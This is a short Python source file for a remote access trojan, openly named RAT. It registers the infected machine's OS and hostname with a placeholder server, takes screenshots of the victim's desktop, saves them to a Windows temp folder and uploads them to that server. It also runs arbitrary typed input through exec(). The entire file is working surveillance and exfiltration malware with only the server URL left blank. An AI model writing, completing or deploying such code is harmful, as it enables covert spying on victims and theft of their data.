import shortuuid, platform, socket, requests, pyautogui, os

class RAT():
    def __init__(self):
        self.uuid = self.register()

    def register(self):
        tuuid = shortuuid.uuid()
        response = requests.post("URL HERE!", data={"name": f"{platform.system()}-{socket.gethostname()}", "id": tuuid})
        return tuuid

    def victimscreenshot(self):
        desktop = os.path.join("C:\\Windows\\Temp\\")
        sct = pyautogui.screenshot()
        sct.save(desktop + "RAT.jpg")
        response = requests.post("URL HERE !",
        files={"image":("RAT.jpg", open(desktop+"RAT.jpg", "rb").read())},
        data={"device":self.uuid})

rat = RAT()

while (cmd := input(">- ")) != "quit":
    exec(cmd)
